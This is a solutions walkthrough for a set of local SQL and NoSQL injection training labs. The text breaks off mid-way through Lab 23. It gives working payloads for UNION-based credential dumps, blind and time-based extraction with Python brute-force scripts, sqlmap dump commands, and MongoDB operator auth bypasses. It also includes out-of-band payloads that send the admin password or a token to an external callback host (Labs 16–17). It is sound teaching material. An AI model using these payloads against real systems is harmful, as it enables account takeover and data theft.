# 🛡️ SQL & NoSQL Injection Labs — Complete Solver Guide

> **Author:** Lab Solutions  
> **Labs:** 01–24 (SQLi + NoSQLi)  
> **Tools:** Browser, Burp Suite, curl, Python scripts, SQLMap (Labs 17–20 only)

---

## Table of Contents

- [Lab 01 — Hidden Data Retrieval](#lab-01--hidden-data-retrieval)
- [Lab 02 — Login Bypass](#lab-02--login-bypass)
- [Lab 03 — UNION Attack (Column Count)](#lab-03--union-attack-column-count)
- [Lab 04 — UNION Text Finding](#lab-04--union-text-finding)
- [Lab 05 — Retrieve Data via UNION (Oracle Simulation)](#lab-05--retrieve-data-via-union-oracle-simulation)
- [Lab 06 — Multi-Column Retrieval (Column Count)](#lab-06--multi-column-retrieval-column-count)
- [Lab 07 — Finding Text Column](#lab-07--finding-text-column)
- [Lab 08 — Retrieve Users/Passwords via UNION](#lab-08--retrieve-userspasswords-via-union)
- [Lab 09 — Concatenation in Single Column](#lab-09--concatenation-in-single-column)
- [Lab 10 — Blind Boolean-Based SQLi](#lab-10--blind-boolean-based-sqli)
- [Lab 11 — Conditional Error-Based Blind SQLi](#lab-11--conditional-error-based-blind-sqli)
- [Lab 12 — Visible Error-Based SQLi (PostgreSQL)](#lab-12--visible-error-based-sqli-postgresql)
- [Lab 13 — Time-Based Blind SQLi](#lab-13--time-based-blind-sqli)
- [Lab 14 — Time-Based Data Exfiltration](#lab-14--time-based-data-exfiltration)
- [Lab 15 — OOB Interaction (DNS)](#lab-15--oob-interaction-dns)
- [Lab 16 — OOB Data Exfiltration](#lab-16--oob-data-exfiltration)
- [Lab 17 — The Callback Trap (OOB + Logic)](#lab-17--the-callback-trap-oob--logic)
- [Lab 18 — Filter Evasion OOB](#lab-18--filter-evasion-oob)
- [Lab 19 — Header Injection (SQLMap)](#lab-19--header-injection-sqlmap)
- [Lab 20 — Mass Extraction (SQLMap)](#lab-20--mass-extraction-sqlmap)
- [Lab 21 — NoSQL Login Bypass](#lab-21--nosql-login-bypass)
- [Lab 22 — NoSQL Operator Injection (Auth Bypass)](#lab-22--nosql-operator-injection-auth-bypass)
- [Lab 23 — NoSQL Blind Extraction (Regex)](#lab-23--nosql-blind-extraction-regex)
- [Lab 24 — SSJI (Server-Side JavaScript Injection)](#lab-24--ssji-server-side-javascript-injection)

---

## Lab 01 — Hidden Data Retrieval

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi |
| **Difficulty** | 🟢 Easy |
| **DB** | MySQL |
| **Goal** | Display hidden (unreleased) products by manipulating the WHERE clause |

### Vulnerable Code

```sql
SELECT * FROM products WHERE category = '$category' AND released = 1
```

User input (`category`) is concatenated directly into the query. Products with `released = 0` are hidden.

### Approach: Bypassing the WHERE clause

**Step 1 — Understand the normal behavior**

Visit `http://localhost:5000/?category=Gifts`. Only released products in that category appear.

**Step 2 — Inject to remove the `released = 1` filter**

We close the string literal with `'`, add `OR 1=1` to make the WHERE clause always true, and comment out the rest with `#` (MySQL comment).

**Payload:**
```
' OR 1=1 #
```

**Full URL:**
```
http://localhost:5000/?category=' OR 1=1 %23
```

> `%23` is the URL-encoded form of `#`.

**Step 3 — Result**

The query becomes:
```sql
SELECT * FROM products WHERE category = '' OR 1=1 #' AND released = 1
```

Everything after `#` is commented out. `OR 1=1` makes the condition always true, so **all products** are returned, including the hidden one: **PROTOTYPE ZERO** with the flag `ESI-SBA{MYSQL_DOCK3R_M4ST3R}`.

---

## Lab 02 — Login Bypass

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi |
| **Difficulty** | 🟢 Easy |
| **DB** | MySQL |
| **Goal** | Log in as `administrator` without knowing the password |

### Vulnerable Code

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

Both fields are concatenated directly.

### Approach: Commenting out the password check

**Step 1 — Identify the injection point**

The login form sends `username` and `password` via POST.

**Step 2 — Craft the payload**

We inject into the `username` field to close the string and comment out the password check.

**Payload (username field):**
```
administrator' #
```

**Password field:** anything (e.g., `x`)

**Step 3 — What happens**

The query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator' #' AND password = 'x'
```

Everything after `#` is ignored. The query matches the `administrator` row regardless of password.

**Step 4 — Result**

You are logged in as **administrator** and redirected to the dashboard.

---

## Lab 03 — UNION Attack (Column Count)

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION) |
| **Difficulty** | 🟢 Easy |
| **DB** | MySQL |
| **Goal** | Determine the number of columns returned by the query |

### Vulnerable Code

```sql
SELECT name, category FROM products WHERE category = '$category'
```

The query returns **2 columns**.

### Approach: Using ORDER BY or UNION SELECT NULL

**Method A — ORDER BY**

Increment the column index until you get an error:

```
' ORDER BY 1 #    → OK
' ORDER BY 2 #    → OK
' ORDER BY 3 #    → ERROR (column 3 doesn't exist)
```

**Conclusion:** The query returns **2 columns**.

**Method B — UNION SELECT NULL**

```
' UNION SELECT NULL #          → ERROR (1 column ≠ 2 columns)
' UNION SELECT NULL, NULL #    → OK ✅
```

**Full URL:**
```
http://localhost:5000/?category=' UNION SELECT NULL, NULL %23
```

**Result:** A row with empty/null values appears, confirming 2 columns.

---

## Lab 04 — UNION Text Finding

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION) |
| **Difficulty** | 🟢 Easy |
| **DB** | MySQL |
| **Goal** | Find which column accepts text, then enumerate tables & columns and log in as admin |

### Vulnerable Code

```sql
SELECT name, description FROM products WHERE category = '$category'
```

Returns 2 columns. The hidden table is `users_x9d2k` with columns `username_u8s1` and `password_p4w9`.

### Approach: Schema enumeration via UNION + information_schema

**Step 1 — Confirm column count**

```
' UNION SELECT NULL, NULL #    → Works (2 columns)
```

Both columns accept text (both are VARCHAR/TEXT).

**Step 2 — List all tables**

```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() #
```

**Result:** You see `products` and `users_x9d2k`.

**Step 3 — List columns of the target table**

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_x9d2k' #
```

**Result:** Columns are `id`, `username_u8s1`, `password_p4w9`.

**Step 4 — Extract credentials**

```
' UNION SELECT username_u8s1, password_p4w9 FROM users_x9d2k #
```

**Result:** `administrator` / `P@ssw0rd_Y0u_F0und_M3!`

**Step 5 — Log in**

Go to `/login`, enter:
- Username: `administrator`
- Password: `P@ssw0rd_Y0u_F0und_M3!`

**Flag:** `ESI-SBA{M4PP1NG_M4ST3R_DB_HACK3R}`

---

## Lab 05 — Retrieve Data via UNION (Oracle Simulation)

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION, Oracle syntax) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL (simulating Oracle) |
| **Goal** | Enumerate Oracle-style system tables and retrieve admin credentials |

### Vulnerable Code

```sql
SELECT name, description FROM products WHERE category = '$category'
```

The app simulates Oracle behavior:
- Requires `FROM dual` in UNION queries
- Uses `all_tables` and `all_tab_columns` instead of `information_schema`
- Throws Oracle-style error messages

### Approach: Oracle-style schema enumeration

**Step 1 — Confirm 2 columns (Oracle requires FROM dual)**

```
' UNION SELECT NULL, NULL FROM dual #
```

> In Oracle, every SELECT must have a FROM clause. `dual` is a dummy table.

**Step 2 — List tables from `all_tables`**

```
' UNION SELECT table_name, owner FROM all_tables #
```

**Result:** You see `USERS_Z9Y1` owned by `LAB05`.

**Step 3 — List columns from `all_tab_columns`**

```
' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS_Z9Y1' #
```

**Result:** `USERNAME_A1` and `PASSWORD_B2`.

**Step 4 — Dump credentials**

```
' UNION SELECT USERNAME_A1, PASSWORD_B2 FROM USERS_Z9Y1 #
```

**Result:** `administrator` / `3gg_Sh3ll_0racle_H4ck`

**Step 5 — Log in at `/login`**

**Flag:** `ESI-SBA{ORACL3_S1MUL4T1ON_SUCC3SS}`

---

## Lab 06 — Multi-Column Retrieval (Column Count)

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL |
| **Goal** | Determine that the query returns 3 columns |

### Vulnerable Code

```sql
SELECT name, description, price FROM products WHERE category = '$category'
```

Returns **3 columns**.

### Approach: Incrementally test with UNION SELECT NULL

**Step 1 — Test column count**

```
' UNION SELECT NULL, NULL #          → ERROR (2 ≠ 3)
' UNION SELECT NULL, NULL, NULL #    → OK ✅
```

**Full URL:**
```
http://localhost:5000/?category=' UNION SELECT NULL, NULL, NULL %23
```

**Step 2 — Result**

A row with all NULLs appears, and the app shows:
> 🎉 CONGRATULATIONS! You determined the correct number of columns (3).

---

## Lab 07 — Finding Text Column

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL |
| **Goal** | Find which column accepts text and inject a specific string |

### Vulnerable Code

```sql
SELECT id, name, stock FROM products WHERE category = '$category'
```

Returns 3 columns: `id` (INT), `name` (VARCHAR), `stock` (INT). The app simulates strict type checking — injecting text into INT columns causes an error.

A target string (e.g., `x7k9p2`) is displayed on the page and must appear in the results.

### Approach: Test each column for text compatibility

**Step 1 — Try text in column 1 (INT → fails)**

```
' UNION SELECT 'x7k9p2', NULL, NULL #
```
→ Error: "Conversion failed when converting the varchar value to data type int."

**Step 2 — Try text in column 2 (VARCHAR → works!)**

```
' UNION SELECT NULL, 'x7k9p2', NULL #
```
→ ✅ The target string appears in the results.

**Step 3 — Try text in column 3 (INT → fails)**

```
' UNION SELECT NULL, NULL, 'x7k9p2' #
```
→ Error: conversion failed.

**Result:** **Column 2** (name) accepts text. The app confirms success.

---

## Lab 08 — Retrieve Users/Passwords via UNION

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL |
| **Goal** | Extract usernames and passwords from a hidden `users` table |

### Vulnerable Code

```sql
SELECT name, description FROM products WHERE category = '$category'
```

2 columns, both text. A hidden `users` table has `username` and `password` columns.

### Approach: Direct UNION dump

**Step 1 — Confirm 2 text columns**

```
' UNION SELECT 'test1', 'test2' #    → Works
```

**Step 2 — Dump the users table**

```
' UNION SELECT username, password FROM users #
```

**Result:**

| name | description |
|------|-------------|
| administrator | Sup3r_S3cr3t_P@ssw0rd_Retrieved! |
| guest | guest123 |
| student | esi-sba-2026 |

**Step 3 — Log in at `/login`**

- Username: `administrator`
- Password: `Sup3r_S3cr3t_P@ssw0rd_Retrieved!`

**Flag:** `ESI-SBA{UN10N_DUMP_SUCC3SS}`

---

## Lab 09 — Concatenation in Single Column

| Property | Value |
|----------|-------|
| **Type** | In-Band SQLi (UNION + Concatenation) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL |
| **Goal** | Extract data when only one column accepts text |

### Vulnerable Code

```sql
SELECT id, name FROM products WHERE category = '$category'
```

2 columns: `id` (INT — strict type check), `name` (VARCHAR). Only column 2 accepts text.

### Approach: Concatenate username and password into a single column

**Step 1 — Confirm column types**

```
' UNION SELECT NULL, 'test' #    → Works
' UNION SELECT 'test', NULL #    → Error (column 1 is INT)
```

**Step 2 — Use CONCAT to merge data into column 2**

```
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users #
```

**Result:**

| id | name |
|----|------|
| NULL | administrator:Complex_P@ss_With_C0ncat! |
| NULL | carlos:sierra |

**Step 3 — Log in at `/login`**

- Username: `administrator`
- Password: `Complex_P@ss_With_C0ncat!`

**Flag:** `ESI-SBA{C0NCAT3NAT10N_K1NG}`

---

## Lab 10 — Blind Boolean-Based SQLi

| Property | Value |
|----------|-------|
| **Type** | Blind SQLi (Boolean-based) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL |
| **Goal** | Extract the admin password character by character using true/false responses |

### Vulnerable Code

```sql
SELECT id FROM tracking WHERE id = '$TrackingId'
```

Injection is via the `TrackingId` **cookie**. If the query returns a row → "Welcome back" message appears. If not → no message.

### Approach: Boolean-based character-by-character extraction

**Step 1 — Confirm the injection works**

Set cookie:
```
TrackingId=auth_8f93j2k' AND 1=1 #
```
→ "Welcome back" appears ✅

```
TrackingId=auth_8f93j2k' AND 1=0 #
```
→ "Welcome back" disappears ✅

**Step 2 — Determine password length**

```
auth_8f93j2k' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=8 #
```

Try values 1, 2, 3... until "Welcome back" appears. The password `7b439c21` is **8 characters**.

**Step 3 — Extract each character**

```
auth_8f93j2k' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='7' #
```

Repeat for positions 1–8, testing characters `a-z`, `0-9`.

**Python automation script:**

```python
import requests

url = "http://localhost:5000/"
charset = "abcdef0123456789"  # hex characters
password = ""

for pos in range(1, 9):
    for c in charset:
        cookie = f"auth_8f93j2k' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{c}' #"
        r = requests.get(url, cookies={"TrackingId": cookie})
        if "Welcome" in r.text:
            password += c
            print(f"[+] Position {pos}: {c}  →  {password}")
            break

print(f"\n[✓] Password: {password}")
```

**Result:** Password is `7b439c21`

**Flag:** `ESI-SBA{BL1ND_SQL1_BOOL3AN_M4ST3R}`

---

## Lab 11 — Conditional Error-Based Blind SQLi

| Property | Value |
|----------|-------|
| **Type** | Blind SQLi (Error-based conditional) |
| **Difficulty** | 🟡 Medium |
| **DB** | MySQL (simulating Oracle) |
| **Goal** | Extract password using conditional errors (HTTP 200 vs 500) |

### Vulnerable Code

```sql
SELECT id FROM tracking WHERE id = '$TrackingId'
```

The app simulates Oracle behavior with `PIPES_AS_CONCAT` mode. `TO_CHAR` is stripped (Oracle → MySQL translation). If a SQL error occurs (e.g., division by zero `1/0`), the server returns **HTTP 500**. Otherwise **HTTP 200**.

### Approach: Trigger errors conditionally based on password characters

**Step 1 — Confirm the error-based oracle**

```
Cookie: TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END) || '
```
→ HTTP 500 (1=1 is true → division by zero triggered)

```
Cookie: TrackingId=xyz' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END) || '
```
→ HTTP 200 (1=0 is false → no error)

**Step 2 — Determine password length**

```
xyz' || (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 THEN TO_CHAR(1/0) ELSE '' END) || '
```

If HTTP 500 → length is 20. The password `j98b23c71a32f5e8d90z` is **20 characters**.

**Step 3 — Extract each character**

```
xyz' || (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='j' THEN TO_CHAR(1/0) ELSE '' END) || '
```

HTTP 500 = correct character. HTTP 200 = wrong character.

**Python automation script:**

```python
import requests

url = "http://localhost:5000/"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for pos in range(1, 21):
    for c in charset:
        payload = f"xyz' || (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{c}' THEN TO_CHAR(1/0) ELSE '' END) || '"
        r = requests.get(url, cookies={"TrackingId": payload})
        if r.status_code == 500:
            password += c
            print(f"[+] Position {pos}: {c}  →  {password}")
            break

print(f"\n[✓] Password: {password}")
```

**Result:** Password is `j98b23c71a32f5e8d90z`

**Flag:** `ESI-SBA{COND1T1ONAL_ERR0R_SQL1}`

---

## Lab 12 — Visible Error-Based SQLi (PostgreSQL)

| Property | Value |
|----------|-------|
| **Type** | Error-Based SQLi |
| **Difficulty** | 🟡 Medium |
| **DB** | PostgreSQL |
| **Goal** | Force the database to leak data inside error messages |

### Vulnerable Code

```sql
SELECT * FROM tracking WHERE id = '$TrackingId'
```

PostgreSQL returns **verbose error messages** to the user. The cookie has a 100-character limit.

### Approach: Use CAST to force a type conversion error that leaks data

**Step 1 — Trigger a basic error**

```
Cookie: TrackingId='
```
→ PostgreSQL error appears in the page (syntax error).

**Step 2 — Use CAST to leak data in the error message**

The technique uses `CAST(... AS INT)` on a string value. PostgreSQL will show the string value in the error message.

```
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --
```

**Result:** PostgreSQL error message:
```
ERROR: invalid input syntax for type integer: "postgres_error_leaks_secrets"
```

The password is leaked directly in the error message!

**Step 3 — Log in at `/login`**

- Username: `administrator`
- Password: `postgres_error_leaks_secrets`

**Flag:** `ESI-SBA{P0STGR3S_C4ST_ERR0R_L34K}`

---

## Lab 13 — Time-Based Blind SQLi

| Property | Value |
|----------|-------|
| **Type** | Time-Based Blind SQLi |
| **Difficulty** | 🟡 Medium |
| **DB** | PostgreSQL |
| **Goal** | Confirm SQL injection exists by making the database sleep |

### Vulnerable Code

```sql
SELECT * FROM tracking WHERE id = '$TrackingId'
```

The app is **fully blind**: no error messages, no visible difference in the page. The only way to detect injection is by measuring **response time**.

### Approach: Use pg_sleep() to confirm injection

**Step 1 — Baseline: normal response time**

```
Cookie: TrackingId=x
```
→ Response in ~50ms

**Step 2 — Inject pg_sleep() via string concatenation**

```
Cookie: TrackingId=x' || pg_sleep(5) --
```

→ Response takes **~5 seconds** ✅

> PostgreSQL evaluates `pg_sleep(5)` even though it's concatenated with a string, because the function is executed before the concatenation error is raised.

**Step 3 — Confirm it's controllable**

```
Cookie: TrackingId=x' || pg_sleep(10) --
```
→ Response takes **~10 seconds** ✅

**Result:** SQL injection confirmed via time-based detection. The database responds to our sleep commands.

---

## Lab 14 — Time-Based Data Exfiltration

| Property | Value |
|----------|-------|
| **Type** | Time-Based Blind SQLi (Data Exfiltration) |
| **Difficulty** | 🔴 Hard |
| **DB** | PostgreSQL |
| **Goal** | Extract the admin password character by character using response time |

### Vulnerable Code

```sql
SELECT * FROM tracking WHERE id = '$TrackingId'
```

Same as Lab 13 but now we need to **exfiltrate data**, not just confirm injection.

### Approach: Conditional pg_sleep based on character comparison

**Step 1 — Determine password length**

```
Cookie: TrackingId=x'; SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=12 THEN pg_sleep(3) ELSE pg_sleep(0) END --
```

If response takes ~3 seconds → length is 12. The password `t1m3_i5_k3y!` is **12 characters**.

**Step 2 — Extract each character**

```
Cookie: TrackingId=x'; SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='t' THEN pg_sleep(3) ELSE pg_sleep(0) END --
```

If response takes ~3 seconds → character is correct.

**Python automation script:**

```python
import requests
import time

url = "http://localhost:5000/"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_!@#"
password = ""

for pos in range(1, 13):
    for c in charset:
        payload = f"x'; SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{c}' THEN pg_sleep(3) ELSE pg_sleep(0) END --"
        start = time.time()
        r = requests.get(url, cookies={"TrackingId": payload})
        elapsed = time.time() - start
        
        if elapsed >= 2.5:
            password += c
            print(f"[+] Position {pos}: {c}  →  {password}")
            break

print(f"\n[✓] Password: {password}")
```

**Result:** Password is `t1m3_i5_k3y!`

**Flag:** `ESI-SBA{T1ME_B4SED_EXF1LTR4T1ON_K1NG}`

---

## Lab 15 — OOB Interaction (DNS)

| Property | Value |
|----------|-------|
| **Type** | Out-of-Band (OOB) SQLi |
| **Difficulty** | 🔴 Hard |
| **DB** | Simulated Oracle |
| **Goal** | Force the database to make an external DNS/HTTP request |

### Vulnerable Code

The app parses the `TrackingId` cookie for Oracle XXE payloads containing `EXTRACTVALUE` + `xmltype` + HTTP URLs.

### Approach: Oracle XXE via EXTRACTVALUE to trigger OOB interaction

**Step 1 — Get a callback URL**

Use [Webhook.site](https://webhook.site) or Burp Collaborator to get a URL (e.g., `http://your-webhook-url.com`).

**Step 2 — Inject the Oracle XXE payload**

```
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://your-webhook-url.com"> ]><foo>&xxe;</foo>'),'/foo') FROM dual --
```

**Step 3 — Check for the interaction**

- Go to `http://localhost:5000/logs` (built-in log viewer)
- Or check your Webhook.site/Burp Collaborator for incoming requests

**Result:** The app processes the XML, extracts the URL, and makes an HTTP request to your server. You see the hit in the `/logs` page.

---

## Lab 16 — OOB Data Exfiltration

| Property | Value |
|----------|-------|
| **Type** | Out-of-Band SQLi (Data Exfiltration) |
| **Difficulty** | 🔥 Expert |
| **DB** | Simulated Oracle |
| **Goal** | Exfiltrate the admin password via a DNS/HTTP request to your server |

### Vulnerable Code

Same as Lab 15, but the app now simulates the SQL execution: if the payload contains `SELECT password FROM users WHERE username='administrator'`, it substitutes the real password into the URL.

### Approach: Embed a SQL subquery inside the OOB URL

**Step 1 — Get a callback domain**

Use Webhook.site or Burp Collaborator (e.g., `your-collab.net`).

**Step 2 — Craft the exfiltration payload**

The idea: make the database construct a URL like `http://PASSWORD.your-collab.net` and send a request to it.

```
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.your-collab.net"> ]><foo>&xxe;</foo>'),'/foo') FROM dual --
```

**Step 3 — Check the logs**

Go to `http://localhost:5000/logs`. You will see:

```
raw_url: http://hz49d2e8b1c7f0a3g6k5.your-collab.net
exfiltrated_data: hz49d2e8b1c7f0a3g6k5
```

**Step 4 — Log in at `/login`**

- Username: `administrator`
- Password: `hz49d2e8b1c7f0a3g6k5`

**Flag:** `ESI-SBA{OOB_EXF1L_M4ST3R}`

---

## Lab 17 — The Callback Trap (OOB + Logic)

| Property | Value |
|----------|-------|
| **Type** | OOB + Logic |
| **Difficulty** | 🔥 Expert |
| **DB** | SQLite (in-memory) |
| **Goal** | Exfiltrate a secret token via an OOB callback |

### Vulnerable Code

The app accepts a `username` via POST. If the input contains `http_exfil(...)`, the app simulates the database making an HTTP request. If `SELECT token FROM tokens` is in the input, the real token value is appended to the URL.

### Approach: Inject the http_exfil pseudo-function with a SQL subquery

**Step 1 — Get a callback URL**

Use [Webhook.site](https://webhook.site) (e.g., `https://webhook.site/your-uuid`).

**Step 2 — Send the payload via POST**

```bash
curl -X POST http://localhost:5000/ \
  -d "username=admin'; http_exfil('https://webhook.site/your-uuid?t=' || (SELECT token FROM tokens)) --"
```

**Step 3 — Check your Webhook.site**

You will see a request to:
```
https://webhook.site/your-uuid?t=CTF{Y0U_H4CK3D_TH3_C4LLB4CK}
```

**Result:** The token/flag is `CTF{Y0U_H4CK3D_TH3_C4LLB4CK}`.

---

## Lab 18 — Filter Evasion OOB

| Property | Value |
|----------|-------|
| **Type** | OOB + WAF Bypass |
| **Difficulty** | 🔥 Expert |
| **DB** | SQLite (in-memory) |
| **Goal** | Bypass WAF filters (no spaces, no UNION keyword) to extract the flag |

### Vulnerable Code

```sql
SELECT * FROM secret WHERE rowid = $id
```

**WAF Rules:**
- Spaces (` `) are **blocked** → HTTP 403
- `UNION` keyword is **blocked** → HTTP 403

### Approach: Use tab characters and alternative syntax to bypass WAF

**Step 1 — Confirm injection**

```
http://localhost:5000/?id=1
```
→ Returns: `Result: FLAG{N0_SP4C3S_ALLOWED_H3R3}`

**Step 2 — Bypass the space filter**

Use `%09` (tab character) or `%0A` (newline) instead of spaces. SQLite accepts these as whitespace.

**Step 3 — Extract the flag directly**

Since `rowid = 1` returns the flag directly:

```
http://localhost:5000/?id=1
```

Or use the tab bypass to run arbitrary queries:

```
http://localhost:5000/?id=1%09OR%091=1
```

> `%09` replaces every space. SQLite treats tabs as valid whitespace separators.

**Step 4 — If you need to query other tables (bypassing UNION filter)**

Use subqueries instead of UNION:

```
http://localhost:5000/?id=(SELECT%09rowid%09FROM%09secret%09LIMIT%091)
```

**Result:** `FLAG{N0_SP4C3S_ALLOWED_H3R3}`

---

## Lab 19 — Header Injection (SQLMap)

| Property | Value |
|----------|-------|
| **Type** | Header-Based SQLi (Automated) |
| **Difficulty** | 🟡 Medium |
| **DB** | SQLite |
| **Goal** | Use SQLMap to exploit SQL injection in the User-Agent header |

### Vulnerable Code

```sql
INSERT INTO admin_logs (user_agent) VALUES ('$User-Agent')
```

The app uses `executescript()` which allows **stacked queries** (multiple SQL statements separated by `;`).

### Approach: SQLMap with custom header injection point

**Step 1 — Identify the injection point**

The vulnerable parameter is the `User-Agent` HTTP header.

**Step 2 — Run SQLMap**

```bash
sqlmap -u "http://localhost:5000/" \
  --header="User-Agent: test*" \
  --technique=S \
  --dbms=sqlite \
  --batch
```

> The `*` marks the injection point in the User-Agent header.  
> `--technique=S` focuses on stacked queries (the only technique that works with INSERT + executescript).

**Step 3 — Enumerate tables**

```bash
sqlmap -u "http://localhost:5000/" \
  --header="User-Agent: test*" \
  --technique=S \
  --dbms=sqlite \
  --tables \
  --batch
```

**Result:** Tables found: `admin_logs`, `sensitive_data`

**Step 4 — Dump the sensitive_data table**

```bash
sqlmap -u "http://localhost:5000/" \
  --header="User-Agent: test*" \
  --technique=S \
  --dbms=sqlite \
  -T sensitive_data \
  --dump \
  --batch
```

**Result:** `admin` / `FLAG{SQLMAP_STACKED_QUERIES_MASTER}`

---

## Lab 20 — Mass Extraction (SQLMap)

| Property | Value |
|----------|-------|
| **Type** | Automated SQLi (Blind Boolean) |
| **Difficulty** | 🔴 Hard |
| **DB** | SQLite (in-memory) |
| **Goal** | Find the hidden flag table among 50+ dummy tables using SQLMap |

### Vulnerable Code

```sql
SELECT 1 WHERE 1=$cat
```

The response differs:
- `"Product exists."` → query returned results (TRUE)
- `"Product missing."` → no results (FALSE)

The database has **50 random dummy tables** and one hidden table `super_hidden_table_x99` with column `secret_flag_col`.

### Approach: SQLMap for automated enumeration

**Step 1 — Confirm injection**

```
http://localhost:5000/?cat=1        → "Product exists."
http://localhost:5000/?cat=1 AND 1=0 → "Product missing."
```

**Step 2 — Run SQLMap to enumerate tables**

```bash
sqlmap -u "http://localhost:5000/?cat=1" \
  -p cat \
  --dbms=sqlite \
  --technique=B \
  --string="Product exists" \
  --tables \
  --batch
```

> `--string="Product exists"` tells SQLMap what the TRUE response looks like.

**Step 3 — Identify the flag table**

Among 50+ tables, look for `super_hidden_table_x99`.

**Step 4 — Dump the flag**

```bash
sqlmap -u "http://localhost:5000/?cat=1" \
  -p cat \
  --dbms=sqlite \
  --technique=B \
  --string="Product exists" \
  -T super_hidden_table_x99 \
  --dump \
  --batch
```

**Result:** `FLAG{SQLMAP_AUTO_DUMP_KING}`

---

## Lab 21 — NoSQL Login Bypass

| Property | Value |
|----------|-------|
| **Type** | NoSQL Injection ($where) |
| **Difficulty** | 🟢 Easy |
| **DB** | Simulated MongoDB |
| **Goal** | Display all products (including unreleased) by injecting into a $where JavaScript clause |

### Vulnerable Code

The app constructs a MongoDB `$where` JavaScript query:
```javascript
this.category == 'USER_INPUT'
```

### Approach: JavaScript injection to short-circuit the condition

**Step 1 — Understand normal behavior**

```
http://localhost:5000/?category=Gifts
```
→ Only released products in "Gifts" category appear.

**Step 2 — Inject JavaScript OR to bypass the filter**

The payload `Gifts'||1||'` makes the query:
```javascript
this.category == 'Gifts' || 1 || ''
```

`|| 1` always evaluates to truthy, so **all products** are returned (including unreleased ones).

**Payload URL:**
```
http://localhost:5000/?category=Gifts'||1||'
```

**Step 3 — Result**

All 5 products appear, including hidden ones like "Mystery Box" and "Smart Watch v2".

---

## Lab 22 — NoSQL Operator Injection (Auth Bypass)

| Property | Value |
|----------|-------|
| **Type** | NoSQL Operator Injection |
| **Difficulty** | 🟡 Medium |
| **DB** | Simulated MongoDB |
| **Goal** | Bypass authentication using MongoDB operators ($ne, $regex) |

### Vulnerable Code

The login endpoint accepts JSON and passes it directly to the query engine:
```javascript
db.users.findOne({ username: INPUT, password: INPUT })
```

The `mongo_match` function supports `$ne` (not equal) and `$regex` operators.

### Approach: Use $ne operator to bypass password check

**Step 1 — Send a normal login (for reference)**

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "administrator", "password": "wrong"}'
```
→ `{"status": "fail"}`

**Step 2 — Inject $ne operator**

The `$ne` (not equal) operator matches any value that is NOT the specified one. By setting password to `{"$ne": ""}`, it matches any non-empty password.

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "administrator", "password": {"$ne": ""}}'
```

→ `{"status": "success", "redirect": "/"}` ✅

**Step 3 — Alternative: Bypass BOTH fields**

To log in as the first user in the database (administrator):

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

This matches the first user where username ≠ "" AND password ≠ "" → `administrator`.

**Step 4 — Using $regex**

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "administrator", "password": {"$regex": ".*"}}'
```

`$regex: ".*"` matches any string.

---

## Lab 23 — NoSQL Blind Extraction (Regex)

| Property | Value |
|----------|-------|
| **Type** | NoSQL Blind Injection (Regex-based) |
| **Difficulty** | 🟡 Medium |
| **DB** | Simulated MongoDB |
| **Goal** | Extract the administrator's password character by character using regex |

### Vulnerable Code

The `/user/lookup?user=` endpoint injects user input into a JavaScript `$where` context:
```javascript
this.username == 'USER_INPUT'
```

The app supports JS syntax: `&&`, `||`, `.length`, array indexing `[0]`.

### Approach: Blind extraction using JavaScript conditions

**Step 1 — Log in with a known account**

Log in as `wiener:peter` to get a session (required to access `/user/lookup`).

**Step 2 — Confirm injection in `/user/lookup`**

```
/user/lookup?user=wiener
```
→ Returns wiener's info (200 OK)

```
/user/lookup?user=invalid
```
→ Returns 404

**Step 3 — Determine administrator password length**

```
/user/lookup?user=administrator' && this.password.length < 10 || 'a'=='b
```

If 200 → length < 10. If 404 → length ≥ 10.

Try different values:
```
